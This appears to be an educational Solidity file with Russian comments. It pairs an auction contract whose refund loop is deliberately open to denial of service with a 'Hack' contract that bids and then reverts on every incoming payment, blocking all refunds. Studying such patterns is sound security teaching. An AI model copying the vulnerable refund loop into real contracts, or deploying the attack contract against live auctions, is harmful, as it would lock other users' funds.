// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

/**
 * @title AuctionDenialOfService
 * @author HiH_DimaN
 * @notice Контракт аукциона, уязвимый к атаке Denial of Service (DoS).
 */
contract AuctionDenialOfService {
    /**
     * @dev Отображение, хранящее ставки участников аукциона.
     */
    mapping(address bidder => uint) public bids; // Отображение ставок участников аукциона

    /**
     * @dev Массив адресов участников аукциона.
     */
    address[] public bidders; // Массив адресов участников аукциона

    /**
     * @dev Функция для подачи ставки в аукционе.
     */
    function bid() external payable {
        bids[msg.sender] += msg.value; // Добавляем ставку к существующей ставке отправителя
        bidders.push(msg.sender); // Добавляем отправителя в массив участников
    }

    /**
     * @dev Функция для возврата средств участникам аукциона.
     * Уязвима к атаке DoS.
     */
    function refund() external {
        for(uint i = 0; i < bidders.length; ++i) { // Цикл по массиву участников
            address currentBidder = bidders[i]; // Получаем адрес текущего участника

            uint refundAmount = bids[currentBidder]; // Получаем сумму возврата для текущего участника

            bids[currentBidder] = 0; // Сбрасываем ставку текущего участника

            if(refundAmount > 0) {
                (bool ok,) = currentBidder.call{value: refundAmount}(""); // Отправляем средства текущему участнику
                require(ok, "can`t send"); // Проверяем успешность отправки
            }
        }
    }
}


/**
 * @title Hack
 * @author HiH_DimaN
 * @notice Контракт, который атакует контракт AuctionDenialOfService, вызывая DoS атаку.
 */
contract Hack {
    /**
     * @dev Ссылка на атакуемый контракт.
     */
    AuctionDenialOfService toHack; // Ссылка на атакуемый контракт

    /**
     * @dev Константа, определяющая сумму ставки.
     */
    uint constant BID_AMOUNT = 100; // Сумма ставки

    /**
     * @dev Флаг, определяющий возможность выполнения атаки.
     */
    bool isHackingEnabled = true; // Флаг, определяющий возможность выполнения атаки

    /**
     * @dev Конструктор контракта, который атакует аукцион.
     * @param _toHack Адрес атакуемого контракта.
     */
    constructor(address _toHack) payable {
        require(msg.value == BID_AMOUNT); // Проверяем, что отправлена правильная сумма ставки

        toHack = AuctionDenialOfService(_toHack); // Устанавливаем ссылку на атакуемый контракт
        toHack.bid{value: msg.value}(); // Делаем ставку в аукционе
    }

    /**
     * @dev Функция для отключения атаки.
     */
    function disableHacking() external {
        isHackingEnabled = false; // Отключаем атаку
    }

    /**
     * @dev Функция, которая выполняет атаку Denial of Service.
     */
    receive() external payable {
        if(isHackingEnabled) {
            assert(false); // Вызывает ошибку, что приводит к DoS атаке
        }
    }
}